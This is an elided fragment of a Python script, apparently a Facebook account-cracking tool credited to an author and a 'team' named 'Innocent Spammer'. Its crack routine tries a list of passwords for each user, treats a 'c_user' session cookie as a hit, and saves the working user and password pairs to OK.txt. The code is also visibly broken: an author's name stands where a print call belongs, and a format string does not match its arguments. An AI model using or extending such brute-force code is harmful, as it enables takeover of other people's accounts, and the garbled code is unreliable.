...
class __crack__:
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				TUHIN AHMMED('\r\033[1;92m[Successful-AKING] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
...
....##.....#######..##.....##.####.##....##
 [*]=============================================
    Author   : TUHIN AHMMED
    Facebook : https://facebook.com/Tuhin.Ahmed.21834
    Team     : Innocent Spammer
    Connect  : 01886750862
 [*]=============================================
...
def sep():
	logo()
	os.system("xdg-open https://youtube.com/channel/@mdtuhinmia3869")
	time.sleep(3)
	readline___Public_Xml()
